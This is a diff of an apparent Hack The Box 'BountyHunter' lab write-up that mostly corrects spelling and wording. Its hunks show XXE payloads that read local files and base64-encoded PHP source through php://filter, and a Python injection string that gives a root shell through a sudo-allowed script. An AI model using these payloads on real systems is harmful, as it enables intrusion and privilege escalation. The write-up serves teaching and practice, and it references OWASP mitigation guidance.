@@ -1,13 +1,24 @@
 
 # BountyHunter
 
+- Introduction
+- Summary
 - Walkthrough
 - Mitigrations
 - References
 
+
+## Indroduction 
+
+The Bountyhunter host gives a good look at the issue that can arise from the XML processing and the exploitation of custom scripts along with potently unnecessary privileges.
+
+## Summary 
+
+The target host was found to have three major issues. First the bur sumbitting process contained a vulnerability 
+
 ## BountyHunter
 
-The tester started with an nmap scan to identify the open ports:
+The tester started with an nmap scan to identify the host services:
 
 ```
 └──╼ $nmap -p 22,80 -A 10.10.11.100 -oA BountyHunter_service
@@ -31,11 +42,12 @@ Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
 ┌─[rang3r@parrot]─[~/Projects/machines/BountyHunter]
 ```
 
-The tester browsed to port 80. Browsing the web site led to the "http://10.10.11.100/log_submit.php" page which contained a service for reporting bugs. The tester tested and discovered that the "data" parameter for the logging system is vulnerble to XML External Entity Injection. 
+The tester browsed to port 80. Browsing the web site led to the "http://10.10.11.100/log_submit.php" page which contained a service for reporting software bugs. The tester tested and discovered that the "data" parameter for the logging system is vulnerable to XML External Entity Injection which enables a user to interfere with the applications processing of xml data.
 
-This allowed the tester to create a custom entity and reference it in the request. The service encodes the request using base64 and percent-encoding (URL), therefore the tester used the decoder feature on burp suite to encode and decode requests. To decode requires URL then base64, to encode the request to be sent back to the server requires the reverse, base64 then url.
+This allowed the tester to create a custom entity and reference it in the request. The service encoded the request using base64 and percent-encoding (URL), therefore the tester used the decoder feature on burp suite to encode and decode requests. To decode, requires URL then base64. To encode the request, to be sent back to the server requires the reverse, base64 then URL.
 
-```unencodered data
+
+```unencoded data
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 	<!DOCTYPE email [
  	<!ENTITY test  "This is a test">
@@ -73,8 +85,7 @@ If DB were ready, would have added:
 </table>
 ```
 
-You can see above that the service used refernced and printed the entity. In this case "This is a tast!". This vulnerablility enabled the tester to read local files using the "system" keyword to define as external reference, which was tested by viewing the passwd file using the below payload encoded. 
-
+You can see above that the service used referenced and printed the entity. In this case "This is a test!". This vulnerability enabled the tester to read local files using the "system" keyword to define as external reference, which was tested by viewing the passwd file using the below payload encoded.
 
 ```unencoded data 
 <?xml  version="1.0" encoding="ISO-8859-1"?>
@@ -173,7 +184,7 @@ js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration:
 ```
 
 
-The tester viewed the db.php file using a modified version of the payload. As the file was a php file it needed to be encoded in base64 as the page contains characters that break the XML format.
+The tester viewed the db.php file using a modified version of the payload. As the file was a php file it needed to be encoded in base64, as the page contains characters that break the XML format.
 The tester used the php wrapper "php://filter/convert.base64-encode/" to fetch in the file and return it in base64.
 
 
@@ -223,7 +234,7 @@ The tester decoded the base64 to show the contents of the db.php file, obtaining
 $dbserver = "localhost";
 $dbname = "bounty";
 $dbusername = "admin";
-$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$dbpassword = "m<password>K";
 $testuser = "test"Owo
 ```
 
@@ -252,7 +263,7 @@ bountyhunter
 development@bountyhunter:~$ 
 ```
 
-The development account is able to run the ticketValidator program as root.
+The development account is able to run the ticketValidator script as root.
 
 ```
 development@bountyhunter:/opt/skytrain_inc$ sudo -l
@@ -260,7 +271,7 @@ Matching Defaults entries for development on bountyhunter:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User development may run the following commands on bountyhunter:
-    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
 development@bountyhunter:/opt/skytrain_inc$ 
 
 ```
@@ -279,7 +290,7 @@ The 33th line of code is what needs to be looked at, it requires the remainder o
 **18+__import__('os').system('bash')**
 ```
 
-The asterisk sysmbols are removed by the script. Next is the  18. This, after using the modulo operator against 7 will have a remainder of 4, which will clear the scripts check on line 33. The rest of the payload simply imports the "os" module and calling the function system to execute the bash command. This will spawn a root shell in the middle of the script running process.
+The asterisk sysmbols are removed by the script. Next is the 18. This, after using the modulo operator against 7 will have a remainder of 4, which will clear the scripts check on line 33 of the script. The rest of the payload simply imports the "os" module and calls the function system to execute the bash command. This will spawn a root shell in the middle of the script running process.
 
 
 ```The ticket that will spawn a bash shell.
@@ -320,6 +331,7 @@ root@bountyhunter:/opt/skytrain_inc#
 
 ## References
 
+https://portswigger.net/web-security/xxe
 https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
 
 
